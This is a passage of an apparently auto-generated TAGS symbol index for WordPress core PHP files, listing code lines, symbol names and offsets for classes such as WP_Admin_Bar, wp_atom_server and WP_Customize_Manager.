					$this->error="socket creation failed (-3)";error1161,34929
					$this->error="dns lookup failure (-4)";error1163,34991
					$this->error="connection refused or timed out (-5)";error1165,35049
					$this->error="connection failed (".$errno.")";error1167,35120
	function _disconnect($fp)_disconnect1178,35442
	function _prepare_post_body($formvars, $formfiles)_prepare_post_body1192,35828
		$postdata = '';postdata1196,35946
				$this->_mime_boundary = "Snoopy".md5(uniqid(microtime()));_mime_boundary1215,36475
						$fp = fopen($file_name, "r");fp1238,37301
						$file_content = fread($fp, filesize($file_name));file_content1239,37337
						$base_name = basename($file_name);base_name1241,37412

wordpress/wp-includes/class-wp-admin-bar.php,3986
class WP_Admin_Bar {WP_Admin_Bar2,6
	private $nodes = array();nodes3,27
	private $nodes = array();nodes3,27
	private $bound = false;bound4,54
	private $bound = false;bound4,54
	public $user;user5,79
	public function __get( $name ) {__get7,95
	public function initialize() {initialize19,501
		$this->user = new stdClass;user20,533
			$admin_bar_args = get_theme_support( 'admin-bar' ); // add_theme_support( 'admin-bar', array( 'callback' => '__return_false') );admin_bar_args41,1415
			$header_callback = $admin_bar_args[0]['callback'];header_callback42,1547
			$header_callback = '_admin_bar_bump_cb';header_callback46,1639
	public function add_menu( $node ) {add_menu56,1837
	public function remove_menu( $id ) {remove_menu60,1906
	public function add_node( $args ) {add_node75,2508
			$args = array_merge( array( 'parent' => func_get_arg(0) ), func_get_arg(2) );args78,2684
			$args = get_object_vars( $args );args81,2794
		$defaults = array(defaults93,3154
		if ( $maybe_defaults = $this->get_node( $args['id'] ) )maybe_defaults103,3383
			$defaults = get_object_vars( $maybe_defaults );defaults104,3441
		$args = wp_parse_args( $args, $defaults );args110,3663
		$back_compat_parents = array(back_compat_parents112,3709
	final protected function _set_node( $args ) {_set_node126,4284
	final public function get_node( $id ) {get_node135,4439
		if ( $node = $this->_get_node( $id ) )node136,4480
	final protected function _get_node( $id ) {_get_node140,4548
			$id = 'root';id145,4649
	final public function get_nodes() {get_nodes151,4740
	   if ( ! $nodes = $this->_get_nodes() )nodes152,4777
	       $node = clone $node;node156,4870
	final protected function _get_nodes() {_get_nodes161,4928
	final public function add_group( $args ) {add_group178,5386
	public function remove_node( $id ) {remove_node189,5558
	final protected function _unset_node( $id ) {_unset_node193,5629
	public function render() {render197,5712
		$root = $this->_bind();root198,5740
	final protected function _bind() {_bind203,5813
			if ( ! $parent = $this->_get_node( $node->parent ) ) {parent231,6584
			$group_class = ( $node->parent == 'root' ) ? 'ab-top-menu' : 'ab-submenu';group_class236,6752
				$default_id = $parent->id . '-default';default_id246,7130
				$default    = $this->_get_node( $default_id );default247,7174
					$default = $this->_get_node( $default_id );default265,7792
				$parent = $default;parent268,7884
				$container_id = $parent->id . '-container';container_id273,8102
				$container    = $this->_get_node( $container_id );container274,8150
					$container = $this->_get_node( $container_id );container290,8679
					$grandparent = $this->_get_node( $parent->parent );grandparent293,8795
						$index = array_search( $parent, $grandparent->children, true );index298,8926
						if ( $index === false )index299,8996
				$parent = $container;parent308,9216
		$root = $this->_get_node( 'root' );root318,9402
		$this->bound = true;bound319,9440
	final protected function _render( $root ) {_render323,9483
		$class = 'nojq nojs';class328,9641
	final protected function _render_container( $node ) {_render_container352,10225
	final protected function _render_group( $node ) {_render_group363,10562
		$class = empty( $node->meta['class'] ) ? '' : $node->meta['class'];class370,10767
	final protected function _render_item( $node ) {_render_item379,11054
		$is_parent = ! empty( $node->children );is_parent383,11147
		$has_link  = ! empty( $node->href );has_link384,11190
		$tabindex = isset( $node->meta['tabindex'] ) ? (int) $node->meta['tabindex'] : 10;tabindex386,11230
		$menuclass = '';menuclass388,11316
		$aria_attributes = 'tabindex="' . $tabindex . '"';aria_attributes389,11335
			$menuclass = 'menupop';menuclass392,11411
	public function recursive_render( $id, $node ) {recursive_render445,12831
	public function add_menus() {add_menus450,13018

wordpress/wp-includes/class-wp-ajax-response.php,1119
class WP_Ajax_Response {WP_Ajax_Response8,98
	var $responses = array();responses16,222
	var $responses = array();responses16,222
	function __construct( $args = '' ) {__construct27,485
	function __construct( $args = '' ) {args27,485
	function add( $args = '' ) {add55,1564
	function add( $args = '' ) {args55,1564
		$defaults = array(defaults56,1594
		$r = wp_parse_args( $args, $defaults );r63,1761
		$position = preg_replace( '/[^a-z0-9:_-]/i', '', $position );position65,1831
			$data = $id;data68,1924
			$id = 0;id69,1940
		$response = '';response72,1957
				$class = '';class78,2240
					$class = ' class="' . get_class($error_data) . '"';class80,2293
					$error_data = get_object_vars($error_data);error_data81,2350
					foreach ( $error_data as $k => $v )k89,2584
			$response = "<response_data><![CDATA[$data]]></response_data>";response96,2731
		$s = '';s99,2803
			foreach ( $supplemental as $k => $v )k101,2849
			$s = "<supplemental>$s</supplemental>";s103,2927
			$action = $_POST['action'];action107,3002
		$x = '';x109,3034
	function send() {send128,3509

wordpress/wp-includes/class-wp-atom-server.php,16398
class wp_atom_server {wp_atom_server10,123
	var $ATOM_CONTENT_TYPE = 'application/atom+xml';ATOM_CONTENT_TYPE18,217
	var $ATOM_CONTENT_TYPE = 'application/atom+xml';ATOM_CONTENT_TYPE18,217
	var $CATEGORIES_CONTENT_TYPE = 'application/atomcat+xml';CATEGORIES_CONTENT_TYPE26,349
	var $CATEGORIES_CONTENT_TYPE = 'application/atomcat+xml';CATEGORIES_CONTENT_TYPE26,349
	var $SERVICE_CONTENT_TYPE = 'application/atomsvc+xml';SERVICE_CONTENT_TYPE34,487
	var $SERVICE_CONTENT_TYPE = 'application/atomsvc+xml';SERVICE_CONTENT_TYPE34,487
	var $ATOM_NS = 'http://www.w3.org/2005/Atom';ATOM_NS42,615
	var $ATOM_NS = 'http://www.w3.org/2005/Atom';ATOM_NS42,615
	var $ATOMPUB_NS = 'http://www.w3.org/2007/app';ATOMPUB_NS50,737
	var $ATOMPUB_NS = 'http://www.w3.org/2007/app';ATOMPUB_NS50,737
	var $ENTRIES_PATH = "posts";ENTRIES_PATH58,852
	var $ENTRIES_PATH = "posts";ENTRIES_PATH58,852
	var $CATEGORIES_PATH = "categories";CATEGORIES_PATH66,951
	var $CATEGORIES_PATH = "categories";CATEGORIES_PATH66,951
	var $MEDIA_PATH = "attachments";MEDIA_PATH74,1053
	var $MEDIA_PATH = "attachments";MEDIA_PATH74,1053
	var $ENTRY_PATH = "post";ENTRY_PATH82,1151
	var $ENTRY_PATH = "post";ENTRY_PATH82,1151
	var $SERVICE_PATH = "service";SERVICE_PATH90,1244
	var $SERVICE_PATH = "service";SERVICE_PATH90,1244
	var $MEDIA_SINGLE_PATH = "attachment";MEDIA_SINGLE_PATH98,1347
	var $MEDIA_SINGLE_PATH = "attachment";MEDIA_SINGLE_PATH98,1347
	var $params = array();params106,1458
	var $params = array();params106,1458
	var $media_content_types = array('image/*','audio/*','video/*');media_content_types114,1564
	var $media_content_types = array('image/*','audio/*','video/*');media_content_types114,1564
	var $atom_content_types = array('application/atom+xml');atom_content_types122,1706
	var $atom_content_types = array('application/atom+xml');atom_content_types122,1706
	var $selectors = array();selectors130,1839
	var $selectors = array();selectors130,1839
	var $do_output = true;do_output140,1964
	var $do_output = true;do_output140,1964
	function __construct() {__construct148,2088
		$var_by_ref = explode( '/', $_SERVER['SCRIPT_NAME'] );var_by_ref150,2115
		$this->script_name = array_pop( $var_by_ref );script_name151,2172
		$this->app_base = site_url( $this->script_name . '/' );app_base152,2221
		$this->selectors = array(selectors154,2280
	function handle_request() {handle_request183,3013
			$path = $_SERVER['ORIG_PATH_INFO'];path186,3089
			$path = $_SERVER['PATH_INFO'];path188,3135
		$method = $_SERVER['REQUEST_METHOD'];method190,3170
			$this->do_output = false;do_output197,3377
			$method = 'GET';method198,3406
		if (strlen($path) == 0 || $path == '/')path202,3483
		foreach ( $this->selectors as $regex => $funcs ) {regex210,3821
	function get_service() {get_service239,4545
		$entries_url = esc_attr($this->get_entries_url());entries_url244,4706
		$categories_url = esc_attr($this->get_categories_url());categories_url245,4759
		$media_url = esc_attr($this->get_attachments_url());media_url246,4818
		$accepted_media_types = '';accepted_media_types247,4873
			$accepted_media_types = $accepted_media_types . "<accept>" . $med . "</accept>";accepted_media_types249,4952
		$atom_prefix="atom";atom_prefix251,5040
		$atom_blogname = get_bloginfo('name');atom_blogname252,5063
		$service_doc = <<<EODservice_doc253,5104
	function get_categories_xml() {get_categories_xml279,5831
		$home = esc_attr(get_bloginfo_rss('url'));home284,5999
		$categories = "";categories286,6045
		$cats = get_categories(array('hierarchical' => 0, 'hide_empty' => 0));cats287,6065
		$output = <<<EODoutput291,6258
	function create_post() {create_post306,6526
		$parser = new AtomParser();parser310,6635
		$entry = array_pop($parser->feed->entries);entry314,6719
		$publish = ! ( isset( $entry->draft ) && 'yes' == trim( $entry->draft ) );publish316,6766
		$cap = ($publish) ? 'publish_posts' : 'edit_posts';cap317,6843
		$catnames = array();catnames322,7024
		$wp_cats = get_categories(array('hide_empty' => false));wp_cats329,7182
		$post_category = array();post_category331,7242
		$blog_ID = get_current_blog_id();blog_ID338,7398
		$post_status = ($publish) ? 'publish' : 'draft';post_status339,7434
		$post_author = (int) $user_ID;post_author340,7485
		$post_title   = '';post_title342,7519
		$post_content = '';post_content343,7541
		$post_excerpt = '';post_excerpt344,7563
		$pubtimes     = '';pubtimes345,7585
			$post_title = (string) $entry->title[1];post_title348,7699
			$post_content = (string) $entry->content[1];post_content350,7840
			$post_excerpt = (string) $entry->summary[1];post_excerpt352,7985
			$pubtimes = (string) $entry->published;pubtimes354,8070
		$pubtimes = $this->get_publish_time( $pubtimes );pubtimes356,8114
		$post_date = $pubtimes[0];post_date358,8167
		$post_date_gmt = $pubtimes[1];post_date_gmt359,8196
			$post_name = $_SERVER['HTTP_SLUG'];post_name362,8270
		$post_data = compact('blog_ID', 'post_author', 'post_date', 'post_date_gmt', 'post_content', 'post_title', 'post_category', 'post_status', 'post_excerpt', 'post_name');post_data364,8310
		$postID = wp_insert_post($post_data);postID368,8512
		$output = $this->get_entry($postID);output383,9117
	function get_post($postID) {get_post395,9283
		$output = $this->get_entry($postID);output402,9536
	function put_post($postID) {put_post414,9690
		$parser = new AtomParser();parser419,9858
		$parsed = array_pop($parser->feed->entries);parsed423,9941
		$publish = ! ( isset($parsed->draft) && 'yes' == trim($parsed->draft) );publish432,10203
		$post_status = ($publish) ? 'publish' : 'draft';post_status437,10430
		$post_title = $parsed->title[1];post_title441,10502
		$post_content = $parsed->content[1];post_content442,10537
		$post_excerpt = $parsed->summary[1];post_excerpt443,10576
		$pubtimes = $this->get_publish_time($entry->published);pubtimes444,10615
		$post_date = $pubtimes[0];post_date445,10673
		$post_date_gmt = $pubtimes[1];post_date_gmt446,10702
		$pubtimes = $this->get_publish_time($parsed->updated);pubtimes447,10735
		$post_modified = $pubtimes[0];post_modified448,10792
		$post_modified_gmt = $pubtimes[1];post_modified_gmt449,10825
		$postdata = compact('ID', 'post_content', 'post_title', 'post_category', 'post_status', 'post_excerpt', 'post_date', 'post_date_gmt', 'post_modified', 'post_modified_gmt');postdata451,10863
		$result = wp_update_post($postdata);result454,11067
	function delete_post($postID) {delete_post471,11386
			$result = wp_delete_post($postID);result483,11734
	function get_attachment($postID = null) {get_attachment501,12036
			$output = $this->get_entry($postID, 'attachment');output512,12453
	function create_attachment() {create_attachment522,12600
		$type = $this->get_accepted_content_type();type524,12633
		$fp = fopen("php://input", "rb");fp529,12804
		$bits = null;bits530,12840
		$slug = '';slug536,12931
			$slug = $_SERVER['HTTP_SLUG'];slug538,12985
			$slug = $_SERVER['HTTP_TITLE'];slug540,13064
			$slug = substr( md5( uniqid( microtime() ) ), 0, 7);slug542,13154
		$ext = preg_replace( '|.*/([a-z0-9]+)|', '$1', $_SERVER['CONTENT_TYPE'] );ext543,13210
		$slug = sanitize_file_name( "$slug.$ext" );slug544,13287
		$file = wp_upload_bits( $slug, null, $bits);file545,13333
		$url = $file['url'];url547,13381
		$file = $file['file'];file548,13404
		$attachment = array(attachment553,13529
		$postID = wp_insert_attachment($attachment, $file);postID563,13737
		$output = $this->get_entry($postID, 'attachment');output568,13907
	function put_attachment($postID) {put_attachment580,14105
		$parser = new AtomParser();parser585,14279
		$parsed = array_pop($parser->feed->entries);parsed590,14366
		$post_title = $parsed->title[1];post_title601,14692
		$post_content = $parsed->summary[1];post_content602,14727
		$pubtimes = $this->get_publish_time($parsed->updated);pubtimes603,14766
		$post_modified = $pubtimes[0];post_modified604,14823
		$post_modified_gmt = $pubtimes[1];post_modified_gmt605,14856
		$postdata = compact('ID', 'post_content', 'post_title', 'post_category', 'post_status', 'post_excerpt', 'post_modified', 'post_modified_gmt');postdata607,14894
		$result = wp_update_post($postdata);result610,15068
	function delete_attachment($postID) {delete_attachment625,15343
		$location = get_post_meta($entry['ID'], '_wp_attached_file', true);location634,15601
		$filetype = wp_check_filetype($location);filetype635,15671
		$result = wp_delete_attachment($postID);result641,15930
	function get_file($postID) {get_file656,16222
		$location = get_post_meta($entry['ID'], '_wp_attached_file', true);location666,16517
		$location = get_option ('upload_path') . '/' . $location;location667,16587
		$filetype = wp_check_filetype($location);filetype668,16647
		if ( $fp = fopen($location, "rb") ) {fp677,16994
	function put_file($postID) {put_file701,17400
		$upload_dir = wp_upload_dir( );upload_dir715,17851
		$location = get_post_meta($entry['ID'], '_wp_attached_file', true);location716,17885
		$filetype = wp_check_filetype($location);filetype717,17955
		$location = "{$upload_dir['basedir']}/{$location}";location719,18000
		$fp = fopen("php://input", "rb");fp724,18244
		$localfp = fopen($location, "w+");localfp725,18280
		$ID = $entry['ID'];ID732,18420
		$pubtimes = $this->get_publish_time($entry->published);pubtimes733,18442
		$post_date = $pubtimes[0];post_date734,18500
		$post_date_gmt = $pubtimes[1];post_date_gmt735,18529
		$pubtimes = $this->get_publish_time($parsed->updated);pubtimes736,18562
		$post_modified = $pubtimes[0];post_modified737,18619
		$post_modified_gmt = $pubtimes[1];post_modified_gmt738,18652
		$post_data = compact('ID', 'post_date', 'post_date_gmt', 'post_modified', 'post_modified_gmt');post_data740,18690
		$result = wp_update_post($post_data);result741,18788
	function get_entries_url($page = null) {get_entries_url759,19175
			$path = $this->MEDIA_PATH;path761,19300
			$path = $this->ENTRIES_PATH;path763,19337
		$url = $this->app_base . $path;url764,19369
	function the_entries_url($page = null) {the_entries_url777,19572
	function get_categories_url($deprecated = '') {get_categories_url789,19778
	function the_categories_url() {the_categories_url800,20018
	function get_attachments_url($page = null) {get_attachments_url812,20204
		$url = $this->app_base . $this->MEDIA_PATH;url813,20250
	function the_attachments_url($page = null) {the_attachments_url827,20472
	function get_service_url() {get_service_url838,20644
	function get_entry_url($postID = null) {get_entry_url850,20836
			$postID = (int) $post->ID;postID853,20920
		$url = $this->app_base . $this->ENTRY_PATH . "/$postID";url856,20955
	function the_entry_url($postID = null) {the_entry_url868,21124
	function get_media_url($postID = null) {get_media_url880,21318
			$postID = (int) $post->ID;postID883,21402
		$url = $this->app_base . $this->MEDIA_SINGLE_PATH ."/file/$postID";url886,21437
	function the_media_url($postID = null) {the_media_url898,21621
	function set_current_entry($postID) {set_current_entry909,21810
		$entry = wp_get_single_post($postID,ARRAY_A);entry917,21948
	function get_posts($page = 1, $post_type = 'post') {get_posts933,22248
	function get_posts($page = 1, $post_type = 'post') {post_type933,22248
		$feed = $this->get_feed($page, $post_type);feed934,22302
	function get_attachments($page = 1, $post_type = 'attachment') {get_attachments946,22544
	function get_attachments($page = 1, $post_type = 'attachment') {post_type946,22544
		$feed = $this->get_feed($page, $post_type);feed948,22648
	function get_feed($page = 1, $post_type = 'post') {get_feed961,22896
	function get_feed($page = 1, $post_type = 'post') {post_type961,22896
		$this->ENTRY_PATH = $post_type;ENTRY_PATH965,23021
			$page = 1;page968,23079
		$page = (int) $page;page970,23097
		$count = get_option('posts_per_rss');count972,23121
		$post = $GLOBALS['post'];post976,23269
		$posts = $GLOBALS['posts'];posts977,23297
		$wp = $GLOBALS['wp'];wp978,23327
		$wp_query = $GLOBALS['wp_query'];wp_query979,23351
		$wpdb = $GLOBALS['wpdb'];wpdb980,23387
		$blog_id = (int) $GLOBALS['blog_id'];blog_id981,23415
		$last_page = $wp_query->max_num_pages;last_page983,23456
		$next_page = (($page + 1) > $last_page) ? null : $page + 1;next_page984,23497
		$prev_page = ($page - 1) < 1 ? null : $page - 1;prev_page985,23559
		$last_page = ((int)$last_page == 1 || (int)$last_page == 0) ? null : (int) $last_page;last_page986,23610
		$self_page = $page > 1 ? $page : null;self_page987,23699
		$feed = ob_get_contents();feed1012,25074
	function get_entry($postID, $post_type = 'post') {get_entry1026,25318
	function get_entry($postID, $post_type = 'post') {post_type1026,25318
				$varname = 'p';varname1030,25423
				$this->ENTRY_PATH = 'attachment';ENTRY_PATH1033,25476
				$varname = 'attachment_id';varname1034,25514
				$entry = ob_get_contents();entry1042,25695
	function echo_entry() { ?>echo_entry1056,25848
	function ok() {ok1097,27711
	function no_content() {no_content1108,27879
	function internal_error($msg = 'Internal Server Error') {internal_error1122,28148
	function bad_request() {bad_request1134,28372
	function length_required() {length_required1145,28554
	function invalid_media() {invalid_media1157,28789
	function forbidden($reason='') {forbidden1168,28992
	function not_found() {not_found1180,29192
	function not_allowed($allow) {not_allowed1191,29368
	function redirect($url) {redirect1202,29571
		$escaped_url = esc_attr($url);escaped_url1203,29598
		$content = <<<EODcontent1204,29631
	function client_error($msg = 'Client Error') {client_error1230,30079
	function created($post_ID, $content, $post_type = 'post') {created1243,30343
	function created($post_ID, $content, $post_type = 'post') {post_type1243,30343
		$edit = $this->get_entry_url($post_ID);edit1244,30404
				$ctloc = $this->get_entry_url($post_ID);ctloc1247,30485
				$edit = $this->app_base . "attachments/$post_ID";edit1250,30563
	function auth_required($msg) {auth_required1269,30973
		$content = <<<EODcontent1275,31196
	function output($xml, $ctype = 'application/atom+xml') {output1300,31647
	function output($xml, $ctype = 'application/atom+xml') {ctype1300,31647
		$xml = '<?xml version="1.0" encoding="' . strtolower(get_option('blog_charset')) . '"?>'."\n".$xml;xml1302,31729
	function escape(&$array) {escape1320,32234
		foreach ($array as $k => $v) {k1323,32279
	function authenticate() {authenticate1341,32596
			$user = wp_authenticate($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']);user1358,33338
	function get_accepted_content_type($types = null) {get_accepted_content_type1376,33682
			$types = $this->media_content_types;types1379,33760
		$type = $_SERVER['CONTENT_TYPE'];type1386,33919
			if ($acceptedType == '*' || $acceptedType == $type) {acceptedType1392,34153
				if ($acceptedSubtype == '*' || $acceptedSubtype == $subtype)acceptedSubtype1393,34210
	function process_conditionals() {process_conditionals1406,34418
				$post = wp_get_single_post($this->params[1]);post1414,34619
				$wp_last_modified = get_post_modified_time('D, d M Y H:i:s', true);wp_last_modified1415,34669
				$post = null;post1416,34741
				$wp_last_modified = mysql2date('D, d M Y H:i:s', get_lastpostmodified('GMT'), 0).' GMT';wp_last_modified1419,34799
		$wp_etag = md5($wp_last_modified);wp_etag1424,34931
			$client_etag = stripslashes($_SERVER['HTTP_IF_NONE_MATCH']);client_etag1430,35123
			$client_etag = false;client_etag1432,35194
		$client_last_modified = trim( $_SERVER['HTTP_IF_MODIFIED_SINCE']);client_last_modified1434,35220
		$client_modified_timestamp = $client_last_modified ? strtotime($client_last_modified) : 0;client_modified_timestamp1436,35366
		$wp_modified_timestamp = strtotime($wp_last_modified);wp_modified_timestamp1439,35518
	function rfc3339_str2time($str) {rfc3339_str2time1457,36026
		$match = false;match1459,36062
	function get_publish_time($published) {get_publish_time1477,36472
		$pubtime = $this->rfc3339_str2time($published);pubtime1479,36514

wordpress/wp-includes/class-wp-customize-control.php,6688
class WP_Customize_Control {WP_Customize_Control10,108
	public $manager;manager11,137
	public $id;id12,155
	public $settings;settings15,207
	public $setting = 'default';setting18,286
	public $setting = 'default';setting18,286
	public $priority          = 10;priority20,317
	public $priority          = 10;priority20,317
	public $section           = '';section21,350
	public $section           = '';section21,350
	public $label             = '';label22,383
	public $label             = '';label22,383
	public $choices           = array();choices24,442
	public $choices           = array();choices24,442
	public $json = array();json26,481
	public $json = array();json26,481
	public $type = 'text';type28,507
	public $type = 'text';type28,507
	function __construct( $manager, $id, $args = array() ) {__construct38,657
	function __construct( $manager, $id, $args = array() ) {args38,657
		$keys = array_keys( get_object_vars( $this ) );keys39,715
		$this->manager = $manager;manager45,866
		$this->id = $id;id46,895
			$this->settings = $id;settings51,973
		$settings = array();settings53,1000
			foreach ( $this->settings as $key => $setting ) {key55,1062
			$this->setting = $this->manager->get_setting( $this->settings );setting59,1196
		$this->settings = $settings;settings62,1310
	public function enqueue() {}enqueue70,1420
	public final function value( $setting_key = 'default' ) {value79,1551
	public final function value( $setting_key = 'default' ) {setting_key79,1551
	public function to_json() {to_json89,1809
		foreach ( $this->settings as $key => $setting ) {key91,1875
	public final function check_capabilities() {check_capabilities105,2255
		$section = $this->manager->get_section( $this->section );section111,2411
	public final function maybe_render() {maybe_render123,2649
	protected function render() {render138,2997
		$id    = 'customize-control-' . str_replace( '[', '-', str_replace( ']', '', $this->id ) );id139,3028
		$class = 'customize-control customize-control-' . $this->type;class140,3122
	public function get_link( $setting_key = 'default' ) {get_link147,3329
	public function get_link( $setting_key = 'default' ) {setting_key147,3329
	public function link( $setting_key = 'default' ) {link154,3554
	public function link( $setting_key = 'default' ) {setting_key154,3554
	protected function render_content() {render_content165,3797
				$name = '_customize-radio-' . $this->id;name187,4438
				foreach ( $this->choices as $value => $label ) :value192,4590
						foreach ( $this->choices as $value => $label )value210,5157
				$dropdown = wp_dropdown_pages(dropdown218,5425
				$dropdown = str_replace( '<select', '<select ' . $this->get_link(), $dropdown );dropdown229,5777
class WP_Customize_Color_Control extends WP_Customize_Control {WP_Customize_Color_Control241,6044
	public $type = 'color';type242,6108
	public $type = 'color';type242,6108
	public $statuses;statuses243,6133
	public function __construct( $manager, $id, $args = array() ) {__construct245,6153
	public function __construct( $manager, $id, $args = array() ) {args245,6153
		$this->statuses = array( '' => __('Default') );statuses246,6218
	public function enqueue() {enqueue250,6319
	public function to_json() {to_json255,6425
	public function render_content() {render_content260,6524
class WP_Customize_Upload_Control extends WP_Customize_Control {WP_Customize_Upload_Control279,7068
	public $type    = 'upload';type280,7133
	public $type    = 'upload';type280,7133
	public $removed = '';removed281,7162
	public $removed = '';removed281,7162
	public $context;context282,7185
	public function enqueue() {enqueue284,7204
	public function to_json() {to_json288,7275
	public function render_content() {render_content297,7442
class WP_Customize_Image_Control extends WP_Customize_Upload_Control {WP_Customize_Image_Control310,7762
	public $type = 'image';type311,7833
	public $type = 'image';type311,7833
	public $get_url;get_url312,7858
	public $statuses;statuses313,7876
	protected $tabs = array();tabs315,7896
	protected $tabs = array();tabs315,7896
	public function __construct( $manager, $id, $args ) {__construct317,7925
		$this->statuses = array( '' => __('No Image') );statuses318,7980
	public function prepare_control() {prepare_control336,8529
	public function to_json() {to_json341,8641
	public function render_content() {render_content346,8740
		$src = $this->value();src347,8776
			$src = call_user_func( $this->get_url, $src );src349,8834
					<?php foreach ( $this->tabs as $id => $tab ): ?>id371,9479
				<?php foreach ( $this->tabs as $id => $tab ): ?>id377,9692
	public function add_tab( $id, $label, $callback ) {add_tab391,10053
	public function remove_tab( $id ) {remove_tab398,10198
	public function tab_upload_new() {tab_upload_new402,10270
	public function tab_uploaded() {tab_uploaded419,10833
	public function print_tab_image( $url, $thumbnail_url = null ) {print_tab_image425,10922
	public function print_tab_image( $url, $thumbnail_url = null ) {thumbnail_url425,10922
		$url = set_url_scheme( $url );url426,10988
		$thumbnail_url = ( $thumbnail_url ) ? set_url_scheme( $thumbnail_url ) : $url;thumbnail_url427,11021
class WP_Customize_Background_Image_Control extends WP_Customize_Image_Control {WP_Customize_Background_Image_Control436,11279
	public function __construct( $manager ) {__construct437,11360
	public function tab_uploaded() {tab_uploaded449,11758
		$backgrounds = get_posts( array(backgrounds450,11792
	public function tab_default_background() {tab_default_background467,12237
class WP_Customize_Header_Image_Control extends WP_Customize_Image_Control {WP_Customize_Header_Image_Control472,12340
	protected $default_headers;default_headers478,12494
	protected $uploaded_headers;uploaded_headers485,12592
	public function __construct( $manager ) {__construct487,12623
	public function prepare_control() {prepare_control517,13439
		$this->default_headers = $custom_image_header->default_headers;default_headers524,13686
		$this->uploaded_headers = get_uploaded_header_images();uploaded_headers525,13752
	public function print_header_image( $choice, $header ) {print_header_image536,14044
		$header_image_data = array( 'choice' => $choice );header_image_data540,14239
	public function tab_uploaded() {tab_uploaded556,14772
		foreach ( $this->uploaded_headers as $choice => $header )choice559,14852
	public function tab_default_headers() {tab_default_headers563,14966
		foreach ( $this->default_headers as $choice => $header )choice564,15007

wordpress/wp-includes/class-wp-customize-manager.php,6615
final class WP_Customize_Manager {WP_Customize_Manager10,94
	protected $theme;theme11,129
	protected $original_stylesheet;original_stylesheet12,148
	protected $previewing = false;previewing14,182
	protected $previewing = false;previewing14,182
	protected $settings = array();settings16,215
	protected $settings = array();settings16,215
	protected $sections = array();sections17,247
	protected $sections = array();sections17,247
	protected $controls = array();controls18,279
	protected $controls = array();controls18,279
	protected $nonce_tick;nonce_tick20,312
	protected $customized;customized22,337
	private $_post_values;_post_values24,362
	public function __construct() {__construct31,435
	public function doing_ajax() {doing_ajax64,1795
	protected function wp_die( $ajax_message, $message = null ) {wp_die77,2133
	protected function wp_die( $ajax_message, $message = null ) {message77,2133
			$message = __( 'Cheatin&#8217; uh?' );message82,2274
	public function wp_die_handler() {wp_die_handler92,2441
	public function setup_theme() {setup_theme105,2738
		$this->original_stylesheet = get_stylesheet();original_stylesheet118,3055
		$this->theme = wp_get_theme( isset( $_REQUEST['theme'] ) ? $_REQUEST['theme'] : null );theme120,3105
	function after_setup_theme() {after_setup_theme140,3704
	public function start_previewing_theme() {start_previewing_theme154,3982
		$this->previewing = true;previewing159,4106
	public function stop_previewing_theme() {stop_previewing_theme185,4966
		$this->previewing = false;previewing189,5052
	public function theme() {theme215,5901
	public function settings() {settings226,6041
	public function controls() {controls237,6187
	public function sections() {sections248,6333
	public function is_theme_active() {is_theme_active259,6488
	public function wp_loaded() {wp_loaded268,6695
	public function wp_redirect_status( $status ) {wp_redirect_status283,7071
	public function post_value( $setting ) {post_value295,7316
				$this->_post_values = json_decode( stripslashes( $_POST['customized'] ), true );_post_values298,7440
				$this->_post_values = false;_post_values300,7533
	public function customize_preview_init() {customize_preview_init312,7760
		$this->nonce_tick = check_ajax_referer( 'preview-customize_' . $this->get_stylesheet(), 'nonce' );nonce_tick313,7804
	public function customize_preview_base() {customize_preview_base336,8556
	public function customize_preview_html5() { ?>customize_preview_html5345,8745
	public function customize_preview_settings() {customize_preview_settings363,9261
		$settings = array(settings364,9309
		foreach ( $this->settings as $id => $setting ) {id376,9668
	public function customize_preview_signature() {customize_preview_signature392,10021
	public function remove_preview_signature( $return = null ) {remove_preview_signature401,10242
	public function remove_preview_signature( $return = null ) {return401,10242
	public function is_preview() {is_preview414,10528
	public function get_template() {get_template425,10723
	public function get_stylesheet() {get_stylesheet436,10930
	public function get_template_root() {get_template_root447,11134
	public function get_stylesheet_root() {get_stylesheet_root458,11360
	public function current_theme( $current_theme ) {current_theme469,11606
	public function save() {save478,11800
	public function add_setting( $id, $args = array() ) {add_setting511,12593
	public function add_setting( $id, $args = array() ) {args511,12593
			$setting = $id;setting513,12693
			$setting = new WP_Customize_Setting( $this, $id, $args );setting515,12719
	public function get_setting( $id ) {get_setting528,12992
	public function remove_setting( $id ) {remove_setting540,13228
	public function add_section( $id, $args = array() ) {add_section552,13466
	public function add_section( $id, $args = array() ) {args552,13466
			$section = $id;section554,13566
			$section = new WP_Customize_Section( $this, $id, $args );section556,13592
	public function get_section( $id ) {get_section569,13864
	public function remove_section( $id ) {remove_section581,14100
	public function add_control( $id, $args = array() ) {add_control593,14338
	public function add_control( $id, $args = array() ) {args593,14338
			$control = $id;control595,14438
			$control = new WP_Customize_Control( $this, $id, $args );control597,14464
	public function get_control( $id ) {get_control610,14737
	public function remove_control( $id ) {remove_control622,14973
	 * Helper function to compare two objects by priority.to627,15058
	protected final function _cmp_priority( $a, $b ) {_cmp_priority634,15206
		$ap = $a->priority;ap635,15258
		$bp = $b->priority;bp636,15280
		if ( $ap == $bp )ap638,15303
	public function prepare_controls() {prepare_controls648,15439
		$this->controls = array_reverse( $this->controls );controls652,15569
		$controls = array();controls653,15623
		foreach ( $this->controls as $id => $control ) {id655,15647
		$this->controls = $controls;controls662,15907
		$this->sections = array_reverse( $this->sections );sections665,15961
		$sections = array();sections667,16077
		$this->sections = $sections;sections676,16323
	public function enqueue_control_scripts() {enqueue_control_scripts684,16433
	public function register_controls() {register_controls695,16621
		$locations      = get_registered_nav_menus();locations868,21889
		$menus          = wp_get_nav_menus();menus869,21937
		$menu_locations = get_nav_menu_locations();menu_locations870,21977
		$num_locations  = count( array_keys( $locations ) );num_locations871,22023
			$choices = array( 0 => __( '&mdash; Select &mdash;' ) );choices881,22582
				$truncated_name = wp_html_excerpt( $menu->name, 40 );truncated_name883,22675
				$truncated_name = ( $truncated_name == $menu->name ) ? $menu->name : trim( $truncated_name ) . '&hellip;';truncated_name884,22733
			foreach ( $locations as $location => $description ) {location888,22900
				$menu_setting_id = "nav_menu_locations[{$location}]";menu_setting_id889,22957
	public function _sanitize_header_textcolor( $color ) {_sanitize_header_textcolor964,24971
function sanitize_hex_color( $color ) {sanitize_hex_color977,25310
function sanitize_hex_color_no_hash( $color ) {sanitize_hex_color_no_hash999,25906
	$color = ltrim( $color, '#' );color1000,25954
function maybe_hash_hex_color( $color ) {maybe_hash_hex_color1016,26284
	if ( $unhashed = sanitize_hex_color_no_hash( $color ) )unhashed1017,26326

wordpress/wp-includes/class-wp-customize-section.php,1217
class WP_Customize_Section {WP_Customize_Section10,108
